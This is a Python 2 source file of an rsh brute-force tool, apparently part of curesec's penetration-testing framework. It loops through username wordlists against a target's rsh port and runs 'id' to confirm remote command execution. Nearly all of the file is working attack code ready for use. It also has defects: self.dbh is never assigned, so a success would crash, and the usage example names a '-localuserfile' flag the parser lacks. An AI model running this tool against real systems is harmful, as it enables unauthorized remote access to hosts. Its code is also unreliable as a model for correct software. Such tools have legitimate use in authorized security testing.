#!/usr/bin/env python2

# Copyright (c) 2014, curesec GmbH
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of
# conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list
# of conditions and the following disclaimer in the documentation and/or other materials
# provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used
# to endorse or promote products derived from this software without specific prior written
# permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
# OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
# TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
from __future__ import with_statement
import sys
import logging
import socket
import argparse
import __builtin__

import ccdClasses as ccd


__version__ = 0.1
__author__ = 'curesec'


# logging
LOG = "/tmp/rsh_bruteforce.log"
FORMAT = '%(asctime)s - %(name)s - ' + \
    '%(levelname)s - %(threadName)s - %(message)s'
logging.basicConfig(filename=LOG,
                    filemode="w",
                    format=FORMAT,
                    level=logging.DEBUG)

logger = logging.getLogger(__name__)
logger.setLevel(logging.WARNING)


def checkiffileexists(path):
    try:
        __builtin__.openany(path, "r")
    except IOError:
        print("Unable to open " + path)
        exit(1)


class RSHBruteForcer(object):
    def __init__(self,
                 host,
                 rport,
                 lport,
                 mode,
                 userfile1,
                 userfile2,
                 timeout,
                 verbose,
                 dbh=None):
        self.host = host
        self.rport = int(rport)
        self.lport = int(lport)
        self.mode = mode
        self.userfile1 = userfile1
        self.userfile2 = userfile2
        self.timeout = int(timeout)
        self.verbose = verbose
        self.countall = 0
        self.countsuccess = 0

    def run(self):
        print("Starting rsh brute force...")

        f1 = __builtin__.openany(self.userfile1, "r")
        for username in f1.readlines():
            username = username.strip()
            if self.mode == "singlemode":
                self.runsinglemode(username)
            else:
                self.runmultimode(username)
        f1.close()

    def runsinglemode(self, username):
        self.testrsh(username, username)

    def runmultimode(self, localusername):
        f2 = __builtin__.openany(self.userfile2, "r")
        for remoteusername in f2.readlines():
            remoteusername = remoteusername.strip()
            self.testrsh(localusername, remoteusername)

    def testrsh(self, localusername, remoteusername):
        s = None
        status = False
        print("Trying: " + localusername + " - " + remoteusername)
        try:
            s = createsocket(self.host, self.lport, self.rport, self.timeout)
            s.send("\x00" + localusername + "\x00" + remoteusername + "\x00id\x00")
            text = ""
            while True:
                data = s.recv(1024)
                if not data:
                    break
                text = text + data
            text = text.strip()
            if self.verbose:
                print("Received output: " + text)
            if "uid" in text and "gid" in text:
                print("SUCCESS: " + localusername + " - " + remoteusername)
                status = True
        except socket.error as e:
            print("socket.error: " + str(e))
            logger.error("socket.error: " + str(e))

        finally:
            if s:
                s.close()

        if status and self.dbh:
            # now, store result entry in data
            self.dbh.add(ccd.RshBruteforceResult(
                host=self.host,
                lport=self.lport,
                rport=self.rport,
                localusername=localusername,
                remoteusername=remoteusername,
            ))


def createsocket(host, lport, rport, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # to avoid "Address already in use"
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(timeout)
        s.bind(("", lport))
        s.connect((host, rport))
        return s
    except Exception as e:
        logger.exception(e)
        print 'Error creating socket'
        sys.exit(1)


def parse_and_run(args, dbh=None):
    description = "### rsh Brute Forcer ###\n" +\
        "Run with root privileges as we must bind a local port between 513 and 1023.\n" +\
        "Authentication is based on the source ip address, the local user and the remote user.\n" +\
        "In singlemode, local users and remote users are the same. Only one list is required for singlemode. Usernames are separated by newlines.\n" +\
        "In multimode, there are two separate lists for local users and remote users. All combinations are tested.\n" +\
        "Output of valid credentials for rsh are in the form of: \"SUCCESS: [localuser] - [remoteuser]\"\n"
    epilog = """Examples:
        rbruteforcer.py -host test.local -mode singlemode -userfile users.txt
        rbruteforcer.py -host test.local -mode multimode -localuserfile localusers.txt -remoteuserfile remoteusers.txt"""

    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawTextHelpFormatter, epilog=epilog)
    parser.add_argument("-host",
                        action="store",
                        dest="host",
                        required=True,
                        help="host name or IP address")
    parser.add_argument("-rport",
                        action="store",
                        dest="rport",
                        required=False,
                        default=514,
                        type=int,
                        help="default: 514 (rsh)")
    parser.add_argument("-lport",
                        action="store",
                        dest="lport",
                        default="1023",
                        required=False,
                        type=int,
                        help="must be between 513 and 1023. Default: 1023")
    parser.add_argument('-mode',
                        action="store",
                        dest="mode",
                        required=True,
                        help="choose singlemode or multimode")
    parser.add_argument('-userfile',
                        action="store",
                        dest="userfile1",
                        required=True,
                        help="list containing usernames")
    parser.add_argument('-remoteuserfile',
                        action="store",
                        dest="userfile2",
                        required=False,
                        help="required for multimode")
    parser.add_argument("-timeout",
                        action="store",
                        dest="timeout",
                        default="5",
                        required=False,
                        help="in seconds. Default: 5")
    parser.add_argument("-v",
                        action="store_true",
                        dest="verbose",
                        required=False,
                        help="verbose")

    if not args:
        parser.print_help()
        sys.exit(1)
    args = parser.parse_args(args)

    if args.mode == "multimode":
        checkiffileexists(args.userfile2)

    rshbruteforcer = RSHBruteForcer(args.host,
                                    args.rport,
                                    args.lport,
                                    args.mode,
                                    args.userfile1,
                                    args.userfile2,
                                    args.timeout,
                                    args.verbose,
                                    dbh)

    rshbruteforcer.run()


if __name__ == '__main__':
    parse_and_run(sys.argv[1:])
